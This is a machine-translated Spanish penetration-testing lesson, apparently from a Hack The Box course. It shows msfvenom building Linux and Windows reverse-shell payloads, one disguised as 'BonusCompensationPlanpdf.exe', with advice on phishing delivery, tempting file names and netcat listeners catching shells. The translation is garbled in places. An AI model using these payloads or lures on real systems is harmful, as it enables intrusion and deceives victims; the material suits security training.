# Elaboración de cargas útiles con msfvenom

Debemos tener en cuenta que el uso de ataques automatizados en Metasploit requiere que alcancemos una máquina de destino vulnerable a través de la red. Considere lo que hicimos en la última sección. A`run the exploit module`, `deliver the payload`, y`establish the shell session`, necesitábamos comunicarnos con el sistema en primer lugar. Esto puede haber sido posible teniendo presencia en la red interna o una red que tiene rutas en la red donde reside el objetivo. Habrá situaciones en las que no tenemos acceso de red directa a una máquina de destino vulnerable. En estos casos, necesitaremos ser astutos en cómo se entrega y ejecutando la carga útil en el sistema. Una de esas formas puede ser usar`MSFvenom`Para elaborar una carga útil y enviarla por mensaje de correo electrónico u otros medios de ingeniería social para impulsar a ese usuario a ejecutar el archivo.

Además de proporcionar una carga útil con opciones de entrega flexibles, MSFvenom también nos permite`encrypt` & `encode`cargas útiles para evitar las firmas comunes de detección antivirus. Practicemos un poco con estos conceptos.

---

# **Practicando con MSFVENOM**

En Pwnbox o cualquier host con MSFvenom instalado, podemos emitir el comando`msfvenom -l payloads`Para enumerar todas las cargas útiles disponibles. A continuación se presentan solo algunas de las cargas útiles disponibles. Se han redactado algunas cargas útiles para acortar la salida y no distraer de la lección central. Eche un vistazo de cerca a las cargas útiles y sus descripciones:

### **Lista de cargas útiles**

Elaboración de cargas útiles con msfvenom

```
xnoxos@htb[/htb]$ msfvenom -l payloadsFramework Payloads (592 total) [--payload <value>]
==================================================

    Name                                                Description
    ----                                                -----------
linux/x86/shell/reverse_nonx_tcp                    Spawn a command shell (staged). Connect back to the attacker
linux/x86/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker
linux/x86/shell/reverse_tcp_uuid                    Spawn a command shell (staged). Connect back to the attacker
linux/x86/shell_bind_ipv6_tcp                       Listen for a connection over IPv6 and spawn a command shell
linux/x86/shell_bind_tcp                            Listen for a connection and spawn a command shell
linux/x86/shell_bind_tcp_random_port                Listen for a connection in a random port and spawn a command shell. Use nmap to discover the open port: 'nmap -sS target -p-'.
linux/x86/shell_find_port                           Spawn a shell on an established connection
linux/x86/shell_find_tag                            Spawn a shell on an established connection (proxy/nat safe)
linux/x86/shell_reverse_tcp                         Connect back to attacker and spawn a command shell
linux/x86/shell_reverse_tcp_ipv6                    Connect back to attacker and spawn a command shell over IPv6
linux/zarch/meterpreter_reverse_http                Run the Meterpreter / Mettle server payload (stageless)
linux/zarch/meterpreter_reverse_https               Run the Meterpreter / Mettle server payload (stageless)
linux/zarch/meterpreter_reverse_tcp                 Run the Meterpreter / Mettle server payload (stageless)
mainframe/shell_reverse_tcp                         Listen for a connection and spawn a  command shell. This implementation does not include ebcdic character translation, so a client wi
                                                        th translation capabilities is required. MSF handles this automatically.
multi/meterpreter/reverse_http                      Handle Meterpreter sessions regardless of the target arch/platform. Tunnel communication over HTTP
multi/meterpreter/reverse_https                     Handle Meterpreter sessions regardless of the target arch/platform. Tunnel communication over HTTPS
netware/shell/reverse_tcp                           Connect to the NetWare console (staged). Connect back to the attacker
nodejs/shell_bind_tcp                               Creates an interactive shell via nodejs
nodejs/shell_reverse_tcp                            Creates an interactive shell via nodejs
nodejs/shell_reverse_tcp_ssl                        Creates an interactive shell via nodejs, uses SSL
osx/armle/execute/bind_tcp                          Spawn a command shell (staged). Listen for a connection
osx/armle/execute/reverse_tcp                       Spawn a command shell (staged). Connect back to the attacker
osx/armle/shell/bind_tcp                            Spawn a command shell (staged). Listen for a connection
osx/armle/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker
osx/armle/shell_bind_tcp                            Listen for a connection and spawn a command shell
osx/armle/shell_reverse_tcp                         Connect back to attacker and spawn a command shell
osx/armle/vibrate                                   Causes the iPhone to vibrate, only works when the AudioToolkit library has been loaded. Based on work by Charlie Miller
library has been loaded. Based on work by Charlie Miller

windows/dllinject/bind_hidden_tcp                   Inject a DLL via a reflective loader. Listen for a connection from a hidden port and spawn a command shell to the allowed host.
windows/dllinject/bind_ipv6_tcp                     Inject a DLL via a reflective loader. Listen for an IPv6 connection (Windows x86)
windows/dllinject/bind_ipv6_tcp_uuid                Inject a DLL via a reflective loader. Listen for an IPv6 connection with UUID Support (Windows x86)
windows/dllinject/bind_named_pipe                   Inject a DLL via a reflective loader. Listen for a pipe connection (Windows x86)
windows/dllinject/bind_nonx_tcp                     Inject a DLL via a reflective loader. Listen for a connection (No NX)
windows/dllinject/bind_tcp                          Inject a DLL via a reflective loader. Listen for a connection (Windows x86)
windows/dllinject/bind_tcp_rc4                      Inject a DLL via a reflective loader. Listen for a connection
windows/dllinject/bind_tcp_uuid                     Inject a DLL via a reflective loader. Listen for a connection with UUID Support (Windows x86)
windows/dllinject/find_tag                          Inject a DLL via a reflective loader. Use an established connection
windows/dllinject/reverse_hop_http                  Inject a DLL via a reflective loader. Tunnel communication over an HTTP or HTTPS hop point. Note that you must first upload data/hop
                                                        /hop.php to the PHP server you wish to use as a hop.
windows/dllinject/reverse_http                      Inject a DLL via a reflective loader. Tunnel communication over HTTP (Windows wininet)
windows/dllinject/reverse_http_proxy_pstore         Inject a DLL via a reflective loader. Tunnel communication over HTTP
windows/dllinject/reverse_ipv6_tcp                  Inject a DLL via a reflective loader. Connect back to the attacker over IPv6
windows/dllinject/reverse_nonx_tcp                  Inject a DLL via a reflective loader. Connect back to the attacker (No NX)
windows/dllinject/reverse_ord_tcp                   Inject a DLL via a reflective loader. Connect back to the attacker
windows/dllinject/reverse_tcp                       Inject a DLL via a reflective loader. Connect back to the attacker
windows/dllinject/reverse_tcp_allports              Inject a DLL via a reflective loader. Try to connect back to the attacker, on all possible ports (1-65535, slowly)
windows/dllinject/reverse_tcp_dns                   Inject a DLL via a reflective loader. Connect back to the attacker
windows/dllinject/reverse_tcp_rc4                   Inject a DLL via a reflective loader. Connect back to the attacker
windows/dllinject/reverse_tcp_rc4_dns               Inject a DLL via a reflective loader. Connect back to the attacker
windows/dllinject/reverse_tcp_uuid                  Inject a DLL via a reflective loader. Connect back to the attacker with UUID Support
windows/dllinject/reverse_winhttp                   Inject a DLL via a reflective loader. Tunnel communication over HTTP (Windows winhttp)

```

`What do you notice about the output?`

Podemos ver algunos detalles que nos ayudarán a comprender aún más las cargas útiles. En primer lugar, podemos ver que la convención de nombres de carga útil casi siempre comienza enumerando el sistema operativo del objetivo (`Linux`, `Windows`, `MacOS`, `mainframe`, etc...). También podemos ver que algunas cargas útiles se describen como (`staged`) o (`stageless`). Cubro la diferencia.

---

# **Cargas útiles de escenificación versus ciervas**

`Staged`Las cargas útiles crean una forma de enviar más componentes de nuestro ataque. Podemos pensar en ello como si estuviéramos "preparando el escenario" para algo aún más útil. Tomemos, por ejemplo, esta carga útil`linux/x86/shell/reverse_tcp`. Cuando se ejecuta usando un módulo de Exploit en MetaSploit, esta carga útil enviará un pequeño`stage`que se ejecutará en el objetivo y luego vuelva a llamar al`attack box`Para descargar el resto de la carga útil a través de la red, luego ejecuta el shellcode para establecer un shell inverso. Por supuesto, si usamos Metasploit para ejecutar esta carga útil, necesitaremos configurar las opciones para apuntar a los IP y el puerto adecuados para que el oyente atraiga con éxito el shell. Tenga en cuenta que una etapa también ocupa espacio en la memoria, lo que deja menos espacio para la carga útil. Lo que sucede en cada etapa podría variar según la carga útil.

`Stageless`Las cargas útiles no tienen una etapa. Tomemos, por ejemplo, esta carga útil`linux/zarch/meterpreter_reverse_tcp`. Utilizando un módulo de exploit en MetaSploit, esta carga útil se enviará en su totalidad a través de una conexión de red sin una etapa. Esto podría beneficiarnos en entornos en los que no tenemos acceso a mucho ancho de banda y la latencia pueden interferir. Las cargas útiles escenificadas podrían conducir a sesiones de shell inestables en estos entornos, por lo que sería mejor seleccionar una carga útil sin ciervo. Además de esto, las cargas útiles sin ciervo a veces pueden ser mejores para fines de evasión debido a que el tráfico que pasa por la red sobre la red para ejecutar la carga útil, especialmente si la entregamos empleando la ingeniería social. Este concepto también está muy bien explicado por Rapid 7 en esta publicación de blog en[cargas útiles de meterpreter sin ciervo](https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/).

Ahora que entendemos las diferencias entre una carga útil escenificada y sin ciervo, podemos identificarlas dentro de MetaSploit. La respuesta es simple. El`name`Te dará tu primer marcador. Tome nuestros ejemplos de arriba,`linux/x86/shell/reverse_tcp`es una carga útil escenificada, y podemos decir por el nombre ya que cada uno / en su nombre representa una etapa desde el reenvío de la shell. Entonces`/shell/`es una etapa para enviar, y`/reverse_tcp`es otro. Parecerá que todo está presionado para una carga útil sin ciervo. Toma nuestro ejemplo`linux/zarch/meterpreter_reverse_tcp`. Es similar a la carga útil escenificada, excepto que especifica la arquitectura que afecta, luego tiene la carga útil de shell y las comunicaciones de red, todas dentro de la misma función`/meterpreter_reverse_tcp`. Para un último ejemplo rápido de esta convención de nombres, considere estos dos`windows/meterpreter/reverse_tcp`y`windows/meterpreter_reverse_tcp`. El primero es un`Staged`carga útil. Observe la convención de nombres que separa las etapas. Este último es un`Stageless`carga útil ya que vemos la carga útil y la comunicación de red en la misma parte del nombre. Si el nombre de la carga útil no le parece muy claro, a menudo detallará si la carga útil no tiene puesta o no tiene ciervo en la descripción.

---

# **Construir una carga útil sin ciervo**

Ahora construamos una carga útil simple sin ciervo con MSFVENOM y desglose el comando.

### **Construirlo**

Elaboración de cargas útiles con msfvenom

```
xnoxos@htb[/htb]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes

```

### **Llamar a msfvenom**

Elaboración de cargas útiles con msfvenom

```
msfvenom

```

Define la herramienta utilizada para hacer la carga útil.

### **Creando una carga útil**

Elaboración de cargas útiles con msfvenom

```
-p

```

Este`option`Indica que MSFVENOM está creando una carga útil.

### **Elegir la carga útil según la arquitectura**

Elaboración de cargas útiles con msfvenom

```
linux/x64/shell_reverse_tcp

```

Especifica un`Linux` `64-bit`carga útil sin ciervo que iniciará un shell inverso basado en TCP (`shell_reverse_tcp`).

### **Dirección para conectarse a**

Elaboración de cargas útiles con msfvenom

```
LHOST=10.10.14.113 LPORT=443

```

Cuando se ejecuta, la carga útil volverá a llamar a la dirección IP especificada (`10.10.14.113`) en el puerto especificado (`443`).

### **Formato para generar carga útil en**

Elaboración de cargas útiles con msfvenom

```
-f elf

```

El`-f`El indicador especifica el formato en el binario generado. En este caso, será un[.elf archivo](https://en.wikipedia.org/wiki/Executable_and_Linkable_Format).

### **Producción**

Elaboración de cargas útiles con msfvenom

```
> createbackup.elf

```

Crea el .elf binario y nombra el archivo createBackup. Podemos nombrar este archivo lo que queramos. Idealmente, lo llamaríamos algo discreto y/o algo que alguien estaría tentado a descargar y ejecutar.

---

# **Ejecutar una carga útil sin ciervo**

En este punto, tenemos la carga útil creada en nuestro cuadro de ataque. Ahora tendríamos que desarrollar una forma de obtener esa carga útil en el sistema de destino. Hay innumerables formas en que esto se puede hacer. Estas son solo algunas de las formas comunes:

- Mensaje de correo electrónico con el archivo adjunto.
- Descargue el enlace en un sitio web.
- Combinado con un módulo de exploit de MetaSploit (esto probablemente requeriría que ya estemos en la red interna).
- A través de la unidad flash como parte de una prueba de penetración en el sitio.

Una vez que el archivo esté en ese sistema, también deberá ejecutarse.

Imagine por un momento: la máquina de destino es un cuadro Ubuntu que un administrador de TI utiliza para administrar dispositivos de red (alojamiento de scripts de configuración, acceso a enrutadores e conmutadores, etc.). Podríamos hacer que hagan clic en el archivo en un correo electrónico que enviamos porque usaban descuidadamente este sistema como si fuera una computadora personal o una estación de trabajo.

### **Carga útil de Ubuntu**

![](https://academy.hackthebox.com/storage/modules/115/ubuntupayload.png)

Tendríamos un oyente listo para ver la conexión en el lado del cuadro de ataque tras la ejecución exitosa.

### **Conexión NC**

Elaboración de cargas útiles con msfvenom

```
xnoxos@htb[/htb]$ sudo nc -lvnp 443
```

Cuando se ejecuta el archivo, vemos que hemos atrapado un shell.

### **Conexión establecida**

Elaboración de cargas útiles con msfvenom

```
xnoxos@htb[/htb]$ sudo nc -lvnp 443Listening on 0.0.0.0 443
Connection received on 10.129.138.85 60892
env
PWD=/home/htb-student/Downloads
cd ..
ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos

```

Este mismo concepto se puede utilizar para crear cargas útiles para varias plataformas, incluidas Windows.

---

# **Construyendo una carga útil simple sin ciervo para un sistema de Windows**

También podemos usar MSFVENOM para crear un ejecutable (`.exe`) archivo que se puede ejecutar en un sistema de Windows para proporcionar un shell.

### **Carga útil de Windows**

Elaboración de cargas útiles con msfvenom

```
xnoxos@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes

```

La sintaxis del comando se puede descomponer de la misma manera que lo hicimos anteriormente. Las únicas diferencias, por supuesto, son la`platform` (`Windows`) y formato (`.exe`) de la carga útil.

---

# **Ejecutando una carga útil simple sin ciervo en un sistema de Windows**

Esta es otra situación en la que debemos ser creativos para obtener esta carga útil entregada a un sistema objetivo. Sin ninguno`encoding`o`encryption`, la carga útil de esta forma seguramente sería detectada por Windows Defender AV.

![](https://academy.hackthebox.com/storage/modules/115/winpayload.png)

Si el AV estaba deshabilitado, todo lo que el usuario debería hacer es hacer doble clic en el archivo para ejecutar y tendríamos una sesión de shell.

Elaboración de cargas útiles con msfvenom

```
xnoxos@htb[/htb]$ sudo nc -lvnp 443Listening on 0.0.0.0 443
Connection received on 10.129.144.5 49679
Microsoft Windows [Version 10.0.18362.1256]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Users\htb-student\Downloads>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is DD25-26EB

 Directory of C:\Users\htb-student\Downloads

09/23/2021  10:26 AM    <DIR>          .
09/23/2021  10:26 AM    <DIR>          ..
09/23/2021  10:26 AM            73,802 BonusCompensationPlanpdf.exe
               1 File(s)         73,802 bytes
               2 Dir(s)   9,997,516,800 bytes free
```